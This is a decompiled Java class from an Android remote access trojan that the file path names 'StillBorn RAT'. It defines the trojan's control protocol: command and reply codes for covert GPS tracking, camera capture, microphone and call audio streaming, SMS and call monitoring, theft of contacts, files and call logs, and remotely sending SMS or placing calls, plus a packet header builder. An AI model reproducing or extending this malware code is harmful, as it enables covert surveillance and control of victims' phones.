/*   1:    */ package inout;
/*   2:    */ 
/*   3:    */ import java.nio.ByteBuffer;
/*   4:    */ 
/*   5:    */ public class Protocol
/*   6:    */ {
/*   7:    */   public static final int HEADER_LENGTH_DATA = 15;
/*   8:    */   public static final int MAX_PACKET_SIZE = 2048;
/*   9:    */   public static final int PACKET_LOST = 0;
/*  10:    */   public static final int NO_MORE = 1;
/*  11:    */   public static final int SIZE_ERROR = 2;
/*  12:    */   public static final int ALL_DONE = 3;
/*  13:    */   public static final int PACKET_DONE = 4;
/*  14:    */   public static final short DEBUG = 0;
/*  15:    */   public static final short ERROR = 1;
/*  16:    */   public static final short CONNECT = 2;
/*  17:    */   public static final short ENVOI_CMD = 3;
/*  18:    */   public static final short INFOS = 4;
/*  19:    */   public static final short DISCONNECT = 5;
/*  20:    */   public static final short SET_PREFERENCE = 20;
/*  21:    */   public static final short GET_PREFERENCE = 21;
/*  22: 49 */   private static short P_INST = 100;
/*  23: 50 */   public static final short GET_GPS = (short)(P_INST + 0);
/*  24: 51 */   public static final short GET_GPS_STREAM = (short)(P_INST + 1);
/*  25: 52 */   public static final short STOP_GPS_STREAM = (short)(P_INST + 2);
/*  26: 54 */   public static final short GET_PICTURE = (short)(P_INST + 3);
/*  27: 56 */   public static final short GET_SOUND_STREAM = (short)(P_INST + 4);
/*  28: 57 */   public static final short STOP_SOUND_STREAM = (short)(P_INST + 5);
/*  29: 59 */   public static final short GET_VIDEO_STREAM = (short)(P_INST + 6);
/*  30: 60 */   public static final short STOP_VIDEO_STREAM = (short)(P_INST + 7);
/*  31: 62 */   public static final short GET_BASIC_INFO = (short)(P_INST + 8);
/*  32: 63 */   public static final short DO_TOAST = (short)(P_INST + 9);
/*  33: 64 */   public static final short MONITOR_SMS = (short)(P_INST + 10);
/*  34: 65 */   public static final short MONITOR_CALL = (short)(P_INST + 11);
/*  35: 66 */   public static final short GET_CONTACTS = (short)(P_INST + 12);
/*  36: 67 */   public static final short GET_SMS = (short)(P_INST + 13);
/*  37: 68 */   public static final short LIST_DIR = (short)(P_INST + 14);
/*  38: 69 */   public static final short GET_FILE = (short)(P_INST + 15);
/*  39: 70 */   public static final short GIVE_CALL = (short)(P_INST + 16);
/*  40: 71 */   public static final short SEND_SMS = (short)(P_INST + 17);
/*  41: 72 */   public static final short GET_CALL_LOGS = (short)(P_INST + 18);
/*  42: 73 */   public static final short STOP_MONITOR_SMS = (short)(P_INST + 19);
/*  43: 74 */   public static final short STOP_MONITOR_CALL = (short)(P_INST + 20);
/*  44: 75 */   public static final short GET_ADV_INFORMATIONS = (short)(P_INST + 21);
/*  45: 76 */   public static final short OPEN_BROWSER = (short)(P_INST + 22);
/*  46: 77 */   public static final short DO_VIBRATE = (short)(P_INST + 23);
/*  47: 81 */   private static short P_REP = 200;
/*  48: 82 */   public static final short DATA_GPS = (short)(P_REP + 0);
/*  49: 83 */   public static final short DATA_GPS_STREAM = (short)(P_REP + 1);
/*  50: 84 */   public static final short DATA_PICTURE = (short)(P_REP + 2);
/*  51: 85 */   public static final short DATA_SOUND_STREAM = (short)(P_REP + 3);
/*  52: 86 */   public static final short DATA_VIDEO_STREAM = (short)(P_REP + 4);
/*  53: 87 */   public static final short DATA_BASIC_INFO = (short)(P_REP + 5);
/*  54: 88 */   public static final short ACK_TOAST = (short)(P_REP + 6);
/*  55: 89 */   public static final short DATA_MONITOR_SMS = (short)(P_REP + 7);
/*  56: 90 */   public static final short DATA_MONITOR_CALL = (short)(P_REP + 8);
/*  57: 91 */   public static final short DATA_CONTACTS = (short)(P_REP + 9);
/*  58: 92 */   public static final short DATA_SMS = (short)(P_REP + 10);
/*  59: 93 */   public static final short DATA_LIST_DIR = (short)(P_REP + 11);
/*  60: 94 */   public static final short DATA_FILE = (short)(P_REP + 12);
/*  61: 95 */   public static final short ACK_GIVE_CALL = (short)(P_REP + 13);
/*  62: 96 */   public static final short ACK_SEND_SMS = (short)(P_REP + 14);
/*  63: 97 */   public static final short DATA_CALL_LOGS = (short)(P_REP + 15);
/*  64:    */   public static final int ARG_STREAM_AUDIO_MIC = 1;
/*  65:    */   public static final int ARG_STREAM_AUDIO_UPDOWN_CALL = 4;
/*  66:    */   public static final int ARG_STREAM_AUDIO_UP_CALL = 2;
/*  67:    */   public static final int ARG_STREAM_AUDIO_DOWN_CALL = 3;
/*  68:    */   public static final String KEY_SEND_SMS_NUMBER = "number";
/*  69:    */   public static final String KEY_SEND_SMS_BODY = "body";
/*  70:    */   
/*  71:    */   public static byte[] dataHeaderGenerator(int totalLenght, int localLength, boolean moreF, short idPaquet, int channel)
/*  72:    */   {
/*  73:111 */     byte[] byteTotalLength = ByteBuffer.allocate(4).putInt(totalLenght).array();
/*  74:112 */     byte[] byteLocalLength = ByteBuffer.allocate(4).putInt(localLength).array();
/*  75:113 */     byte[] byteMoreF = new byte[1];
/*  76:114 */     if (moreF) {
/*  77:114 */       byteMoreF[0] = 1;
/*  78:    */     } else {
/*  79:115 */       byteMoreF[0] = 0;
/*  80:    */     }
/*  81:116 */     byte[] bytePointeurData = ByteBuffer.allocate(2).putShort(idPaquet).array();
/*  82:117 */     byte[] byteChannel = ByteBuffer.allocate(4).putInt(channel).array();
/*  83:    */     
/*  84:119 */     byte[] header = new byte[15];
/*  85:    */     
/*  86:121 */     System.arraycopy(byteTotalLength, 0, header, 0, byteTotalLength.length);
/*  87:122 */     System.arraycopy(byteLocalLength, 0, header, byteTotalLength.length, byteLocalLength.length);
/*  88:123 */     System.arraycopy(byteMoreF, 0, header, byteTotalLength.length + byteLocalLength.length, byteMoreF.length);
/*  89:124 */     System.arraycopy(bytePointeurData, 0, header, byteTotalLength.length + byteLocalLength.length + byteMoreF.length, bytePointeurData.length);
/*  90:125 */     System.arraycopy(byteChannel, 0, header, byteTotalLength.length + byteLocalLength.length + byteMoreF.length + bytePointeurData.length, byteChannel.length);
/*  91:    */     
/*  92:127 */     return header;
/*  93:    */   }
/*  94:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     inout.Protocol
 * JD-Core Version:    0.7.0.1
 */